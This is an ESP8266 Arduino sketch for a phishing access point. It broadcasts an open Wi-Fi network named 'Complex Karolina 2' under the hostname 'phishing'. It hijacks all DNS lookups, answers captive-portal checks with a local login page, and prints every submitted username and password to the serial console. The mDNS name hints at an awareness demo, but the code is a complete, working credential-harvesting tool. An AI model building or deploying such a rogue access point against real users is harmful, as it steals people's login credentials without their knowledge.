#include <ESP8266WiFi.h>
#include <DNSServer.h>
//#include <Html.h> 
#include <ESPAsyncTCP.h>    
#include <ESPAsyncWebServer.h> 
#include <ESP8266mDNS.h>   
#include <LittleFS.h>


unsigned long previousMillis = 0;
int ledState = LOW;
int interval = 1000;
const byte DNS_PORT = 53;
DNSServer dnsServer;

IPAddress apIP(192, 168, 4, 1);
AsyncWebServer server(80);

void setup() {
  Serial.begin(115200);
  Serial.println();
  pinMode(LED_BUILTIN, OUTPUT);

  if(!LittleFS.begin())
  {
    Serial.println("Mda....");
  }

  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(DNS_PORT, "*", apIP);

  server.serveStatic("/", LittleFS, "/").setCacheControl("max-age=600");

  server.on("/", HTTP_GET, [](AsyncWebServerRequest * request) {
    //request->redirect("/index.html");
    //request->send(200, "text/html", "lolkek");
    Serial.println("/");
    request->send(LittleFS, "/index.html", "text/html");
  });

  server.on("/post", HTTP_POST, [](AsyncWebServerRequest* request){
    Serial.println();
    Serial.println(String("Username: ") + String(request->arg("username")) + String("  Password: ") + String(request->arg("password")));
    request->send(LittleFS, "/index.html", "text/html");
  });

  server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest * request) {
    //request->redirect("/index.html");
    Serial.println("/204");
    //request->send(SPIFFS, "/index.html", "text/html");
    //request->send(200, "text/html", "lolkek");
    request->redirect("/");
  });

  server.on("/fwlink", HTTP_GET, [](AsyncWebServerRequest * request) {
    //request->redirect("/index.html");
    Serial.println("/fwlink");
    request->send(200, "text/html", "lolkek");
  });

  server.onNotFound([](AsyncWebServerRequest * request) {
    //request->send( 200, "text/html", FPSTR(html) );
    request->send(LittleFS, "/index.html", "text/html");
  });

  server.begin();
  WiFi.hostname("phishing");
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("Complex Karolina 2", "", 10);  // open on channel 10

  if (!MDNS.begin("Project911Awareness")) {
    Serial.println(F("Error setting up MDNS responder!"));
  }
  // Add Web Server service to mDNS
  MDNS.addService("http", "tcp", 80);

}

void loop() {
  dnsServer.processNextRequest();
}